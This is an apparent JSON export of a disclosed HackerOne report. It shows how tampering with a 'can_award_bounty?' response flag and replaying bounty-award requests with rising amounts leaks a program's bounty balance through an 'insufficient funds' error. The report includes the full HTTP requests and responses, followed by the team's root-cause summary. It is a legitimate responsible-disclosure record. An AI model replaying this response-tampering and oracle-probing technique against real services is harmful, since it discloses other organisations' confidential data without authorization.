{
  "id": 293593,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTM1OTM=",
  "url": "https://hackerone.com/reports/293593",
  "title": "Able To Check The Exact Bounty Balance of any Bug Bounty Program",
  "state": "Closed",
  "substate": "duplicate",
  "severity_rating": "medium",
  "readable_substate": "Duplicate",
  "created_at": "2017-11-28T21:58:41.580Z",
  "submitted_at": "2017-11-28T21:58:41.580Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cjlegacion",
    "url": "/cjlegacion",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ataRvnqp12kmLg6V4yHSq6Wm/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13,
    "url": "https://hackerone.com/security",
    "handle": "security",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "HackerOne",
      "twitter_handle": "Hacker0x01",
      "website": "https://hackerone.com",
      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-12-06T18:41:46.631Z",
  "bug_reporter_agreed_on_going_public_at": "2017-12-06T18:41:46.466Z",
  "team_member_agreed_on_going_public_at": "2017-11-29T16:18:35.369Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello HackerOne,\nI found a way to check the exact bounty balance of any bug bounty program.\n\n\n### Steps To Reproduce\n\n1. Report to any program that giving a bounty\n2. Go to your `Inbox`\n3. Open the Burp Suite before you click the report you created for your target bug bounty program.\n4. Click the `Intercept is off` to make it `on`, click the report you created and wait for the request like this.\n\nRequest:\n\n```\nGET /reports/240273.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nReferer: https://hackerone.com/bugs?█████████\nX-Requested-With: XMLHttpRequest\nConnection: close\n```\n\n5. Once you see the request above. Go to your Burp Suite, click \"Do Intercept\" > \"Response to this Request\" and edit the response.\n\nResponse:\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 28 Nov 2017 20:33:14 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nCache-Control: private, no-cache, no-store, must-revalidate\nContent-Disposition: inline; filename=\"response.json\"\nContent-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598\nReferrer-Policy: strict-origin-when-cross-origin\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Frame-Options: DENY\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block\nServer: cloudflare-nginx\nCF-RAY: 3c5019db6afc60ae-MNL\nContent-Length: 9669\n\n███\n```\n\n6. Change the value of parameter name `can_award_bounty?` from `false` to `true`\nNote: I change the response of the request so i'm able to use the `Set award` for the request .\n7. Use the `Set award` and intercept the request and put that request to `Repeater`.\n\nRequest:\n\n```\nPOST /reports/bulk HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nReferer: █████\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 174\nConnection: close\n\n████████\n```\nResponse:\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 28 Nov 2017 20:39:58 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nCache-Control: private, no-cache, no-store, must-revalidate\nContent-Disposition: inline; filename=\"response.\"\nContent-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598\nReferrer-Policy: strict-origin-when-cross-origin\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Frame-Options: DENY\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block\nServer: cloudflare-nginx\nCF-RAY: 3c5023b59bf660c0-MNL\nContent-Length: 64\n\n{\"flash\":\"You have successfully awarded a bounty.\",\"reports\":[]}\n```\n\nAs you can see here it's showing that `\"You have successfully awarded a bounty\"` on the response but try to make value of parameter name `bounty_amount` higher that on the request above. By use of that you can actually check the exact bounty balance of the bug bounty program .\n\nRequest with the exact bounty balance of the \"HackerOne Program\":\n\n```\nPOST /reports/bulk HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nReferer: ███\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 176\nConnection: close\n\nmessage=&substate=bounty-award&bounty_amount=31730&reference=&add_reporter_to_original=false&reply_action=set-bounty&reports_count=1&report_ids%5B%5D=240273&bounty_currency=USD\n```\nResponse with the exact bounty balance of the \"HackerOne Program\":\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 28 Nov 2017 20:43:14 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nCache-Control: private, no-cache, no-store, must-revalidate\nContent-Disposition: inline; filename=\"response.\"\nContent-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598\nReferrer-Policy: strict-origin-when-cross-origin\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Frame-Options: DENY\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block\nServer: cloudflare-nginx\nCF-RAY: 3c502882d8246102-MNL\nContent-Length: 64\n\n{\"flash\":\"You have successfully awarded a bounty.\",\"reports\":[]}\n```\n\nTry to make it higher to the exact bounty balance of the \"HackerOne Program\"\n\nRequest with higher than the exact bounty balance of the \"HackerOne Program\":\n\n```\nPOST /reports/bulk HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nReferer: ██████████\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 176\nConnection: close\n\nmessage=&substate=bounty-award&bounty_amount=31731&reference=&add_reporter_to_original=false&reply_action=set-bounty&reports_count=1&report_ids%5B%5D=240273&bounty_currency=USD\n```\n\nResponse with higher than the exact bounty balance of the \"HackerOne Program\":\n\n```\nHTTP/1.1 422 Unprocessable Entity\nDate: Tue, 28 Nov 2017 20:45:47 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nCache-Control: private, no-cache, no-store, must-revalidate\nContent-Disposition: inline; filename=\"response.\"\nContent-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598\nReferrer-Policy: strict-origin-when-cross-origin\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Frame-Options: DENY\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block\nServer: cloudflare-nginx\nCF-RAY: 3c502c3d7bd86102-MNL\nContent-Length: 101\n\n{\"flash\":null,\"reports\":[{\"errors\":[\"Validation failed: insufficient funds to award this bounty.\"]}]}\n```\n\nAs you can see on the response it's showing `\"Validation failed: insufficient funds to award this bounty.\"`\nSo that's how i found a way to check the bounty balance of the bug bounty program.\n\nPS. Even you saw the response `\"flash\":\"You have successfully awarded a bounty.\"` . It's actually not sent to my account or recorded to my account. Also if it's worked maybe i'm gonna be `RICH` now Lol.\n\nThanks,\n@cjlegacion\n\n## Impact\n\nThe attacker are able to see the exact bounty balance of the bug bounty program even the attacker don't have an access on the program.",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": 293299,
  "original_report_url": "https://hackerone.com/reports/293299",
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 26,
  "voters": [
    "jokebookservice1",
    "jensec",
    "europa",
    "bl4de",
    "spam404",
    "flashdisk",
    "fa1rlight",
    "hackedbrain",
    "gamliel",
    "r3y",
    "and 16 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.0,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 3,
    "asset_type": "URL",
    "asset_identifier": "hackerone.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 5983,
      "category": "team",
      "content": "The finder found a vulnerability that allowed them to determine the available bounty balance of some programs. The endpoint that awards a bounty did a balance check before the authorization check and returned an error when the program had insufficient funds. Someone could iterate over all report IDs and try to award a number of bounties to narrow down the balance. The program names were only accessible for public programs. This vulnerability only affected a limited set of our customers.\n\nWe'd like to thank @cyriac and @cjlegacion for bringing this vulnerability to our attention!",
      "user": {
        "id": 2,
        "username": "jobert",
        "name": "Jobert Abma",
        "bio": "Co-founder of HackerOne. ಠ_ಠ",
        "cleared": true,
        "verified": true,
        "website": "https://hackerone.com",
        "location": "San Francisco, CA",
        "created_at": "2013-03-08T01:17:12.256Z",
        "url": "https://hackerone.com/jobert",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 6046,
      "category": "researcher",
      "content": "If you like to check my write-up . This is the link for it :D.\nhttps://twitter.com/LegacionCj/status/938477746237317120",
      "user": {
        "id": 85516,
        "username": "cjlegacion",
        "name": "Cj Legacion",
        "bio": "Just trying",
        "cleared": false,
        "verified": false,
        "website": "https://twitter.com/LegacionCj",
        "location": "Manila,Philippines",
        "created_at": "2016-06-16T11:52:03.161Z",
        "url": "https://hackerone.com/cjlegacion",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/ataRvnqp12kmLg6V4yHSq6Wm/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ataRvnqp12kmLg6V4yHSq6Wm/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/ataRvnqp12kmLg6V4yHSq6Wm/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
